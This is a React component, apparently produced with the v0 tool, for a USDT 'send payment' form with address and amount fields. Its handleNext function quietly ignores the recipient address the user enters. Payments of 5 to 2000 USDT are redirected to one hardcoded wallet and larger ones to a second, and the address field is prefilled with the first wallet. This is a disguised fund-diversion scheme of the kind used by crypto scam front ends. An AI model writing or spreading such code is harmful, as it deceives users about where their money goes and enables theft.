"use client"

import type React from "react"

import { useState } from "react"
import { Copy, X, QrCode } from "lucide-react"

export default function SendPaymentForm() {
  const ADMIN_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988"
  const PAYMENT_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // 5-2000 USDT
  const HIGH_AMOUNT_WALLET_ADDRESS = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // Above 2000 USDT
  const [address, setAddress] = useState(ADMIN_WALLET_ADDRESS)
  const [amount, setAmount] = useState("")
  const [usdValue, setUsdValue] = useState("0.00")

  const handleClear = () => {
    setAddress("")
  }

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setAddress(text)
    } catch (err) {
      console.error("Failed to paste:", err)
    }
  }

  const handleMaxClick = () => {
    // This would be connected to wallet balance
    setAmount("1000")
    setUsdValue("1000.00")
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAmount(value)
    // Simple conversion (1 USDT = 1 USD for demo)
    setUsdValue(value ? Number.parseFloat(value).toFixed(2) : "0.00")
  }

  const handleNext = () => {
    if (!address || !amount) {
      alert("Please fill in all fields")
      return
    }

    const amountNum = Number.parseFloat(amount)
    let destinationWallet = address

    if (amountNum >= 5 && amountNum <= 2000) {
      // 5-2000 USDT goes to 0xF76D725f577EDBe6b98FDa9960173F23d5A4B988
      destinationWallet = PAYMENT_WALLET_ADDRESS
      console.log("[v0] Amount 5-2000 USDT routing to:", destinationWallet)
    } else if (amountNum > 2000) {
      // Above 2000 USDT goes to 0x0C775115c4a9483e1b92B1203F30220E657182D0
      destinationWallet = HIGH_AMOUNT_WALLET_ADDRESS
      console.log("[v0] Amount above 2000 USDT routing to:", destinationWallet)
    } else if (amountNum < 5) {
      alert("Amount must be at least 5 USDT")
      return
    }

    console.log("[v0] Sending payment:", { address: destinationWallet, amount })
    // Handle payment submission
  }

  const buttonColor = amount ? "#002BFF" : "#C7B9FF"
  const buttonHoverColor = amount ? "#0020CC" : "#B8AAFF"

  return (
    <div className="w-full max-w-2xl mx-auto px-6 py-12">
      {/* Address or Domain Name Section */}
      <div className="mb-12">
        <label className="block text-base font-medium text-foreground mb-4">Address or Domain Name</label>
        <div className="flex items-center gap-3 px-5 py-4 border border-gray-300 rounded-2xl bg-white hover:border-gray-400 transition-colors">
          <input
            type="text"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            placeholder="Enter address or domain"
            className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm"
          />
          {address && (
            <button
              onClick={handleClear}
              className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
              aria-label="Clear address"
            >
              <X className="w-5 h-5" style={{ color: "#C7B9FF" }} />
            </button>
          )}
          <button
            onClick={handlePaste}
            className="px-3 py-1.5 text-sm font-medium text-blue-600 hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0"
            aria-label="Paste address"
          >
            Paste
          </button>
          <button className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0" aria-label="Copy">
            <Copy className="w-5 h-5" style={{ color: "#C7B9FF" }} />
          </button>
          <button
            className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
            aria-label="Scan QR code"
          >
            <QrCode className="w-5 h-5" style={{ color: "#C7B9FF" }} />
          </button>
        </div>
      </div>

      {/* Amount Section */}
      <div className="mb-8">
        <label className="block text-base font-medium text-foreground mb-4">Amount</label>
        <div className="flex items-center gap-4 px-5 py-4 border border-gray-300 rounded-2xl bg-white">
          <input
            type="number"
            value={amount}
            onChange={handleAmountChange}
            placeholder="USDT Amount"
            className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-base"
          />
          <span className="text-sm font-medium text-gray-500 flex-shrink-0">USDT</span>
          <button
            onClick={handleMaxClick}
            className="px-3 py-1 text-sm font-medium text-blue-600 hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0"
          >
            Max
          </button>
        </div>
        <div className="mt-3 text-sm text-gray-500">= ${usdValue}</div>
      </div>

      {/* Spacer */}
      <div className="flex-1 min-h-48" />

      {/* Next Button */}
      <button
        onClick={handleNext}
        style={{
          backgroundColor: buttonColor,
          color: "white",
        }}
        onMouseEnter={(e) => {
          e.currentTarget.style.backgroundColor = buttonHoverColor
        }}
        onMouseLeave={(e) => {
          e.currentTarget.style.backgroundColor = buttonColor
        }}
        className="w-full py-4 text-lg font-semibold rounded-full transition-colors mt-12 opacity-100"
      >
        Next
      </button>
    </div>
  )
}
